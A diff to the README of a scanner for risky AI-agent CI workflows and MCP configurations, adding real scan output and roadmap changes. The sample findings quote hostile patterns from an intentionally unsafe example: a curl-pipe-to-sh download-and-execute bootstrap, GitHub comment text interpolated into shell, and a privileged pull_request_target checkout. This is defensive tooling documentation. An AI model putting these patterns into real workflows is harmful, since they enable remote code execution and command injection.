@@ -24,6 +24,7 @@ Read the deeper context:
 - [Threat model](docs/threat-model.md)
 - [Reporting guide](docs/reporting.md)
 - [Adoption guide](docs/adoption.md)
+- [Releasing guide](docs/releasing.md)
 
 ## Quick Start
 
@@ -114,11 +115,11 @@ agentic-risk-scan init-ci --report-artifact
 PYTHONPATH=src python3 -m agentic_risk_scan scan examples/unsafe-ai-pr-bot --fail-on none
 ```
 
-Sample output:
+Real output (reproduce with the command above):
 
 ```text
 Agentic Risk Scan
-root: /path/to/examples/unsafe-ai-pr-bot
+root: examples/unsafe-ai-pr-bot
 risk score: 100/100
 findings: critical=1, high=11, medium=3, low=1
 scanned files: 4, skipped files: 0
@@ -126,6 +127,27 @@ scanned files: 4, skipped files: 0
 [CRITICAL] GHA001 pull_request_target checks out untrusted PR code
   at: .github/workflows/unsafe.yml:16
   why: This workflow runs with target-repository privileges and checks out code from the pull request head.
+  evidence: - uses: actions/checkout@v4
+  fix: Use pull_request with read-only permissions, or split analysis and write-back into separate workflows connected by reviewed artifacts.
+
+[HIGH] GHA003 Untrusted GitHub event data is interpolated into shell
+  at: .github/workflows/unsafe.yml:22
+  why: PR, issue, comment, discussion, or workflow input text is used inside a shell command. Attackers can inject shell syntax through GitHub content.
+  evidence: echo "${{ github.event.comment.body }}" > prompt.txt ...
+  fix: Pass event payload through files or environment variables, quote safely, or process it in a language runtime without shell interpolation.
+
+[HIGH] MCP002 MCP server uses download-and-execute bootstrap
+  at: .mcp.json:3
+  why: MCP server 'bootstrap' downloads code and pipes it into an interpreter.
+  evidence: bash -c curl https://example.invalid/mcp.sh | sh
+  fix: Install MCP servers from pinned packages or checked-in scripts instead of runtime fetches.
+```
+
+Every finding names the input boundary, the risky privilege, the evidence line,
+and the fix. The safe example scores `0/100`:
+
+```bash
+PYTHONPATH=src python3 -m agentic_risk_scan scan examples/safe-agent-workflow --fail-on high
 ```
 
 ## GitHub Actions
@@ -343,7 +365,9 @@ See [docs/reporting.md](docs/reporting.md) for CI artifact examples.
 
 - More agent ecosystem config coverage.
 - Taint tracking for workflow artifacts and generated patches.
-- npm, PyPI, Homebrew, and container releases.
+- PyPI release (automated publish workflow is in place; see
+  [docs/releasing.md](docs/releasing.md) for the trusted-publishing setup).
+- npm, Homebrew, and container releases.
 
 ## Contributing
 
